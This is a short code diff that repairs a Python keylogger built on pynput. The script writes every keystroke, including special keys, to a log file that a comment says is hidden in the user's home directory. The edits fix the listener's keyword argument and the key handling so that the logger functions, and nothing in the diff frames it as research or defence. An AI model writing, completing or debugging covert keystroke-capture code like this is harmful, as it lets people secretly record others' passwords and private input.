@@ -1,6 +1,5 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 import os
-import time
 
 # Path to save the log file, hidden in the user's home directory
 
@@ -14,15 +13,14 @@ def onPress(key):
         try:
             logFile.write(f"{key.char}")
         except AttributeError:
-        # Special keys
-            if key == key.space:
-            # Write a space to the file instead of 'Key.space'
+            if key == Key.space:
                 logFile.write(" ")
             else:
+                # This will write the name of special keys like 'Key.enter'
                 logFile.write(f" {key} ")
 
 def main():
-    with Listener(onPress=onPress) as listener:
+    with Listener(on_press=onPress) as listener:
         listener.join()
 
 if __name__ == '__main__':
